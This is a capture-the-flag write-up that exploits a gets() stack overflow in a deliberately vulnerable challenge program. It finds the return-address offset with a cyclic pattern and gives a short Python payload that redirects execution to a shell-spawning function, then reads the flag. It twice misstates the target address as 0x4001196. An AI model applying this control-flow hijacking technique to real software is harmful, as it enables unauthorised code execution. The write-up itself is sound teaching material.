# Never-gonna-give-you-ub Writeup from L.A.R.S.

## Setup

The local docker setup isn't really helpful, so we're gonna skip that.
What *is* helpful however is `gdb`, `gcc` and `pwntools` (together with `pwndbg`):
```bash
sudo apt update
# gdb and gcc
sudo apt install gdb gcc
# pwntools
sudo apt install python3 python3-pip python3-dev git libssl-dev libffi-dev build-essential
python3 -m pip install --upgrade pip
python3 -m pip install --upgrade pwntools
# pwndbg
git clone https://github.com/pwndbg/pwndbg
cd pwndbg
./setup.sh
cd ..
```

For the remote we use the suggested command:
```bash
ncat --ssl never-gonna-give-you-ub.ctf.kitctf.de 443
```
After entering the team token this gives us an instance for 4 minutes -- challenge accepted!


## Looking around

### Dockerfile

From the `Dockerfile` we learn that the flag lies in `/flag` and that we can merely interact with the program being run via `run.sh`.
This program is built with `gcc` and compiled without PIE (*Position-independent executables*, meaning that the address space layout is not going to randomized), with no stack protector and optimization level set to 0.
So that should make our lifes easier.

### run.sh

From `run.sh` we learn that the program `song_rate` is run with the input, output and error streams modified to be unbuffered.

### song_rater.c

```C
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void scratched_record() {
	printf("Oh no, your record seems scratched :(\n");
	printf("Here's a shell, maybe you can fix it:\n");
	execve("/bin/sh", NULL, NULL);
}

extern char *gets(char *s);

int main() {
	printf("Song rater v0.1\n-------------------\n\n");
	char buf[0xff];
	printf("Please enter your song:\n");
	gets(buf);
	printf("\"%s\" is an excellent choice!\n", buf);
	return 0;
}
```
From `song_rater.c` (so the C program to the relevant executable) we learn that we have a buffer of size `0xff` (that is 255) bytes which we can overflow as much as we want via `gets`.
Also there's a method before called `scratched_record` that isn't called but executes `/bin/sh`.
So that seems to be the goal of our overflow.


## Exploiting

### Quo vadimus?

Firstly we need to figure out the address of where we want to jump to.
Therefore it makes sense to disassemble the binary; for that we can use `objdump`, which should already be installed:
```bash
objdump -drwC -Mintel song_rater
```

The relevant sections are:
```asm
0000000000401196 <scratched_record>:
  401196:	f3 0f 1e fa          	endbr64
  40119a:	55                   	push   rbp
  40119b:	48 89 e5             	mov    rbp,rsp
  40119e:	48 8d 05 63 0e 00 00 	lea    rax,[rip+0xe63]        # 402008 <_IO_stdin_used+0x8>
  4011a5:	48 89 c7             	mov    rdi,rax
  4011a8:	e8 c3 fe ff ff       	call   401070 <puts@plt>
  4011ad:	48 8d 05 7c 0e 00 00 	lea    rax,[rip+0xe7c]        # 402030 <_IO_stdin_used+0x30>
  4011b4:	48 89 c7             	mov    rdi,rax
  4011b7:	e8 b4 fe ff ff       	call   401070 <puts@plt>
  4011bc:	ba 00 00 00 00       	mov    edx,0x0
  4011c1:	be 00 00 00 00       	mov    esi,0x0
  4011c6:	48 8d 05 89 0e 00 00 	lea    rax,[rip+0xe89]        # 402056 <_IO_stdin_used+0x56>
  4011cd:	48 89 c7             	mov    rdi,rax
  4011d0:	e8 bb fe ff ff       	call   401090 <execve@plt>
  4011d5:	90                   	nop
  4011d6:	5d                   	pop    rbp
  4011d7:	c3                   	ret

00000000004011d8 <main>:
  4011d8:	f3 0f 1e fa          	endbr64
  4011dc:	55                   	push   rbp
  4011dd:	48 89 e5             	mov    rbp,rsp
  4011e0:	48 81 ec 00 01 00 00 	sub    rsp,0x100
  4011e7:	48 8d 05 72 0e 00 00 	lea    rax,[rip+0xe72]        # 402060 <_IO_stdin_used+0x60>
  4011ee:	48 89 c7             	mov    rdi,rax
  4011f1:	e8 7a fe ff ff       	call   401070 <puts@plt>
  4011f6:	48 8d 05 88 0e 00 00 	lea    rax,[rip+0xe88]        # 402085 <_IO_stdin_used+0x85>
  4011fd:	48 89 c7             	mov    rdi,rax
  401200:	e8 6b fe ff ff       	call   401070 <puts@plt>
  401205:	48 8d 85 00 ff ff ff 	lea    rax,[rbp-0x100]
  40120c:	48 89 c7             	mov    rdi,rax
  40120f:	e8 8c fe ff ff       	call   4010a0 <gets@plt>
  401214:	48 8d 85 00 ff ff ff 	lea    rax,[rbp-0x100]
  40121b:	48 89 c6             	mov    rsi,rax
  40121e:	48 8d 05 78 0e 00 00 	lea    rax,[rip+0xe78]        # 40209d <_IO_stdin_used+0x9d>
  401225:	48 89 c7             	mov    rdi,rax
  401228:	b8 00 00 00 00       	mov    eax,0x0
  40122d:	e8 4e fe ff ff       	call   401080 <printf@plt>
  401232:	b8 00 00 00 00       	mov    eax,0x0
  401237:	c9                   	leave
  401238:	c3                   	ret
```

From that we can see that our destination address could be `0x4001196`.

We can validate this in `pwndbg`. Therefore we start `gdb`:
```bash
gdb song_rater
```
... and `start` the program.
It should break at the first instruction, where we can jump to our destination (i.e. set the *program counter*) with `set $pc=0x401196` and continue execution with `c`.
And indeed, we enter a shell! We can't do much there though, since it exits after the first instruction. That should be enough anyway.

### To return is to jump

So now we only need to convince the program to jump to this address.
For this we can use a buffer overflow. To understand this, let's take a look at the stack:
```asm
pwndbg> stack 40
00:0000│ rsp 0x7fffffffdcb0 ◂— 0x600000001
01:0008│-0f8 0x7fffffffdcb8 ◂— 0
02:0010│-0f0 0x7fffffffdcc0 —▸ 0x7fffffffdd88 ◂— 0
03:0018│-0e8 0x7fffffffdcc8 ◂— 0xc000
04:0020│-0e0 0x7fffffffdcd0 ◂— 0x140000
05:0028│-0d8 0x7fffffffdcd8 ◂— 0x40 /* '@' */
06:0030│-0d0 0x7fffffffdce0 ◂— 0x40 /* '@' */
07:0038│-0c8 0x7fffffffdce8 —▸ 0x7ffff7fe09c9 (init_cpu_features.constprop+1161) ◂— mov eax, dword ptr [rip + 0x1c16d]
08:0040│-0c0 0x7fffffffdcf0 ◂— 0
09:0048│-0b8 0x7fffffffdcf8 —▸ 0x7fffffffdd80 ◂— 0
0a:0050│-0b0 0x7fffffffdd00 ◂— 2
0b:0058│-0a8 0x7fffffffdd08 ◂— 0x8000000000000006
0c:0060│-0a0 0x7fffffffdd10 ◂— 0
... ↓        5 skipped
12:0090│-070 0x7fffffffdd40 ◂— 0xc000
13:0098│-068 0x7fffffffdd48 ◂— 0x8000
14:00a0│-060 0x7fffffffdd50 ◂— 0
... ↓        8 skipped
1d:00e8│-018 0x7fffffffdd98 —▸ 0x7ffff7fe6e90 (dl_main) ◂— push rbp
1e:00f0│-010 0x7fffffffdda0 ◂— 0
1f:00f8│-008 0x7fffffffdda8 —▸ 0x7ffff7ffdad0 (_rtld_global+2736) —▸ 0x7ffff7fcb000 ◂— 0x3010102464c457f
20:0100│ rbp 0x7fffffffddb0 ◂— 1
21:0108│+008 0x7fffffffddb8 —▸ 0x7ffff7df424a (__libc_start_call_main+122) ◂— mov edi, eax
22:0110│+010 0x7fffffffddc0 —▸ 0x7fffffffdeb0 —▸ 0x7fffffffdeb8 ◂— 0x38 /* '8' */
23:0118│+018 0x7fffffffddc8 —▸ 0x4011d8 (main) ◂— endbr64 
24:0120│+020 0x7fffffffddd0 ◂— 0x100400040 /* '@' */
25:0128│+028 0x7fffffffddd8 —▸ 0x7fffffffdec8 —▸ 0x7fffffffe1f5 ◂— '<path-to-song_rater>'
26:0130│+030 0x7fffffffdde0 —▸ 0x7fffffffdec8 —▸ 0x7fffffffe1f5 ◂— '<path-to-song_rater>'
27:0138│+038 0x7fffffffdde8 ◂— 0x97175ac94f14abd6
```

Ok, that's a lot. However, from `context backtrace` we know that the return address of the current method is `0x7ffff7df424a` which is at `__libc_start_call_main+122`.
If we look closely in aboves stack, we find this address on the stack at position `0x7fffffffddb8` (the stack pointer, `rsp`, currently points to `0x7fffffffdcb0`).
That's because the return address is always `push`ed on the stack before the function is called, and later `pop`ed again from the stack to determine where to jump back to.

So, what does this help us? Well, the `buf` variable is also gonna be on the stack.
And since we have no limitation of how much we can write into `buf`, we can overflow it and keep writing nonsense into the stack until we reach the return address.
There we can write the destination address (`0x4001196`). As soon as the program reaches the `return` statement (i.e. `ret` in assembly) it's going to jump return to `__libc_start_call_main+122`, but rather jump to `scratched_record`.

So much for the theory. But how do we achieve this in practice?

### Cyclic overflows

It's quite tedious to figure out how much exactly we have to overflow until we reach the return address. To make our lives easier, `pwndbg` offers us the `cyclic` function.
`cyclic` prints a requested number of characters that we can then use as input.
The special thing about those characters is that `cyclic` can also identify which set of characters was later used as return address.
This is because each 64bit part of the cyclic characters is unique and thus linkable to the cyclic input.

So we can simply create a cyclic pattern that is certainly longer than what we need and look where the program jumps to.
Since we already know that the buffer is of size 255, we can give it a try with 1000 characters:
```bash
pwndbg> cyclic 1000
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaabhaaaaaabiaaaaaabjaaaaaabkaaaaaablaaaaaabmaaaaaabnaaaaaaboaaaaaabpaaaaaabqaaaaaabraaaaaabsaaaaaabtaaaaaabuaaaaaabvaaaaaabwaaaaaabxaaaaaabyaaaaaabzaaaaaacbaaaaaaccaaaaaacdaaaaaaceaaaaaacfaaaaaacgaaaaaachaaaaaaciaaaaaacjaaaaaackaaaaaaclaaaaaacmaaaaaacnaaaaaacoaaaaaacpaaaaaacqaaaaaacraaaaaacsaaaaaactaaaaaacuaaaaaacvaaaaaacwaaaaaacxaaaaaacyaaaaaaczaaaaaadbaaaaaadcaaaaaaddaaaaaadeaaaaaadfaaaaaadgaaaaaadhaaaaaadiaaaaaadjaaaaaadkaaaaaadlaaaaaadmaaaaaadnaaaaaadoaaaaaadpaaaaaadqaaaaaadraaaaaadsaaaaaadtaaaaaaduaaaaaadvaaaaaadwaaaaaadxaaaaaadyaaaaaadzaaaaaaebaaaaaaecaaaaaaedaaaaaaeeaaaaaaefaaaaaaegaaaaaaehaaaaaaeiaaaaaaejaaaaaaekaaaaaaelaaaaaaemaaaaaaenaaaaaaeoaaaaaaepaaaaaaeqaaaaaaeraaaaaaesaaaaaaetaaaaaaeuaaaaaaevaaaaaaewaaaaaaexaaaaaaeyaaaaaae
```

So, we start in `gdb` with `run` and enter our very specific song name.
This will end in a segfault, but in `gdb` we can see in the backtrace (`context backtrace`) where we currently are (`0x401238`, the `ret` statemt) and where we would jump back to afterwards (`0x6261616161616169`):
```
 ► 0         0x401238 main+96
   1 0x6261616161616169
   2 0x626161616161616a
   3 0x626161616161616b
   4 0x626161616161616c
   5 0x626161616161616d
   6 0x626161616161616e
   7 0x626161616161616f
```

So the relevant return address is 0x6261616161616169. We can then figure out the offset:
```bash
pwndbg> cyclic -l 0x6261616161616169
Finding cyclic pattern of 8 bytes: b'iaaaaaab' (hex: 0x6961616161616162)
Found at offset 264
```

So the 264th entry in the `buf` array of size 255 is the return address.


### Scripting

That is, the 264th entry is the first byte of the return address, then comes the second byte and so on.
Knowing that we need to jump to `0x401196` we can then craft our exploit input with a python script:
```python
dest = 0x401196
# -1 because the 264th element is the start already
offset = 264-1
for i in range(offset):
    print(".", end="")
for i in range(8):
    this = dest & 0xFF
    dest >>= 8
    print(chr(this), end="")
```

We can pipe the output of this script into a file:
```bash
python exploit.py > input
```

Let's pass it as input:
```bash
./song_rater < input
Song rater v0.1
-------------------

Please enter your song:
".......................................................................................................................................................................................................................................................................@" is an excellent choice!
Oh no, your record seems scratched :(
Here's a shell, maybe you can fix it:
```

However, right afterwards the program terminates and we can't interact with the shell.

That's where the modifications from `run.sh` come in handy: Apparently the disabled buffer makes it possible to execute commands that are directly piped into the program.
So we can add a newline to our `input` and execute shell commands there:
```bash
.......................................................................................................................................................................................................................................................................@
cat /flag
```

(Note that the `@` at the end is just a failed attempt to properly display the characters that make up the return address.)

If we execute this (and if the file `/flag` exists and is readable) this does indeed output the local flag. So let's run this on the remote:
```bash
ncat --ssl <our-url>.ctf.kitctf.de 443 < input
Song rater v0.1
-------------------

Please enter your song:
".......................................................................................................................................................................................................................................................................@" is an excellent choice!
Oh no, your record seems scratched :(
Here's a shell, maybe you can fix it:
GPNCTF{<the-flag>}
```
**We got the flag!**
